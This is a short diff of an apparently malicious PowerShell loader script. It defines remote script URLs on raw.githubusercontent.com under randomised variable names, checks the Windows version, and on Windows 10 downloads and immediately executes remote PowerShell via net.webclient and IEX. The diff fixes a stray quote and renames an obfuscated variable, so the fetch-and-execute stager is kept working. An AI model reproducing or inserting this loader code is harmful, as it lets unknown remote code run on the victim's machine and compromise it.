@@ -36,7 +36,7 @@ finally
 
 $hdhcisichd='https://raw.githubusercontent.com/GOTREMOVED/main/lib64.ps1'
 
-$skchixhojsx='https://raw.githubusercontent.com/burnitup545/PrivateRepo/main/lib63.ps1''
+$skchixhojsx='https://raw.githubusercontent.com/burnitup545/PrivateRepo/main/lib63.ps1'
 
 
 $OSVersion = (Get-WmiObject Win32_OperatingSystem).Caption
@@ -54,7 +54,7 @@ if ($OSVersion -match "7")
         
             if ($OSVersion -match "10")
             {
-                $KNoVVlEzEWY = (new-object net.webclient); IeX ($KNoVVlEzEWY.downloadstring($skchixhojsx))
+                $gZcfkMGPN = (new-object net.webclient); IeX ($gZcfkMGPN.downloadstring($skchixhojsx))
             }
 
 
